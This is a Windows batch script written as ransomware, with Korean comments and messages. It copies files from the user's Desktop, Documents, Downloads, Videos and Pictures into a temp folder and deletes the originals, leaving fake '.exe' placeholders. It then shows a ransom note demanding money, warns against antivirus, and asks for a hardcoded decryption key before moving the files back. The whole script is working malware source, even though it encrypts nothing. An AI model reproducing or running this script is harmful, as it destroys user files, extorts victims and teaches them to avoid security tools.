@echo off
chcp 65001

if exist "%temp%\Ransomware" (
	rd /s /q "%temp%\Ransomware"
)

md %temp%\Ransomware
md %temp%\Ransomware\de >nul 2>&1
md %temp%\Ransomware\down >nul 2>&1
md %temp%\Ransomware\doucm  >nul 2>&1
md %temp%\Ransomware\pic >nul 2>&1
md %temp%\Ransomware\videos >nul 2>&1
copy "%userprofile%\Desktop\*.*"  "%temp%\Ransomware\de\" >nul 2>&1
copy "%userprofile%\Downloads\*.*" "%temp%\Ransomware\down\" >nul 2>&1
copy "%userprofile%\Documents\*.*" "%temp%\Ransomware\doucm\" >nul 2>&1
copy "%userprofile%\Videos\*.*" "%temp%\Ransomware\videos\" >nul 2>&1
copy "%userprofile%\Pictures\*.*" "%temp%\Ransomware\pic" >nul 2>&1

:: Desktop 폴더 파일 처리
cd "%userprofile%\Desktop"
For /F "tokens=*" %%i in ('dir /b /s /a-h /a-d') do (
    if /I not "%%~nxi"=="desktop.ini" if /I not "%%~fi"=="%~f0" (
        echo AES Crypto>"%%i.exe"
        Del /f /q "%%i"
    )
)

:: Documents 폴더 파일 처리
cd "%userprofile%\Documents"
For /F "tokens=*" %%a in ('dir /b /s /a-h /a-d') do (
	if /I not "%%~nxa"=="desktop.ini" if /I not "%%~fa"=="%~f0" (
		echo AES Crypto>"%%a.exe"
        	Del /f /q "%%a"
    )
)

:: Videos 폴더 파일 처리
cd "%userprofile%\Videos"
For /F "tokens=*" %%l in ('dir /b /s /a-h /a-d') do (
    if /I not "%%~nxl"=="desktop.ini" if /I not "%%~fl"=="%~f0" (
        echo AES Crypto>"%%l.exe"
        Del /f /q "%%l"
    )
)

:: Pictures 폴더 파일 처리
cd "%userprofile%\Pictures"
For /F "tokens=*" %%j in ('dir /b /s /a-h /a-d') do (
    if /I not "%%~nxj"=="desktop.ini" if /I not "%%~fj"=="%~f0" (
        echo AES Crypto>"%%j.exe"
        Del /f /q "%%j"
    )
)

:: Downloads 폴더 파일 처리
cd "%userprofile%\Downloads"
For /F "tokens=*" %%k in ('dir /b /s /a-h /a-d') do (
	if /I not "%%~nxk"=="desktop.ini" if /I not "%%~fk"=="%~f0" (	
		echo AES Crypto>"%%k.exe"
		Del /f /q "%%k"
	)
)

:: 사용자에게 메시지 출력 및 해독키 입력 요구
:1
echo 당신의 중요한 파일이 암호화되었습니다
echo 해독키를 얻으려면 곽에게 %random%이 돈을 넣어주십시오.
echo 백신 프로그램을 사용하지 마십시오.
echo 파일의 확장자를 바꾸지 마십시오! 변경 시 복구가 불가능할 수 있습니다.
echo 해독키를 입력하십시오:
set /p pass=해독키 입력 : 
goto a

:: 해독키 검사
:b
echo 해독키가 일치하지 않습니다. 다시 입력하십시오.
set /p pass=해독키 입력 : 

:: 올바른 해독키 확인
:a
if not "%pass%"=="HKDML_12345_XMCLXMQPXO_21300xmcc_123c9912mx_12399xmfnf" goto b

:: 암호화된 파일들 삭제
del /f /q "%userprofile%\Desktop\*.exe"
del /f /q "%userprofile%\Documents\*.exe"
del /f /q "%userprofile%\Downloads\*.exe"
del /f /q "%userprofile%\Videos\*.exe"
::del /f /q "%userprofile%\Pictures\*.exe"

:: 원본 파일 복구
move "%temp%\Ransomware\de\*.*" "%userprofile%\Desktop\" >nul 2>&1
move "%temp%\Ransomware\down\*.*" "%userprofile%\Downloads\" >nul 2>&1
move "%temp%\Ransomware\doucm\*.*" "%userprofile%\Documents\" >nul 2>&1
move "%temp%\Ransomware\videos\*.*" "%userprofile%\Videos\" >nul 2>&1
move "%temp%\Ransomware\pic\*.*" "%userprofile%\Pictures\" >nul 2>&1
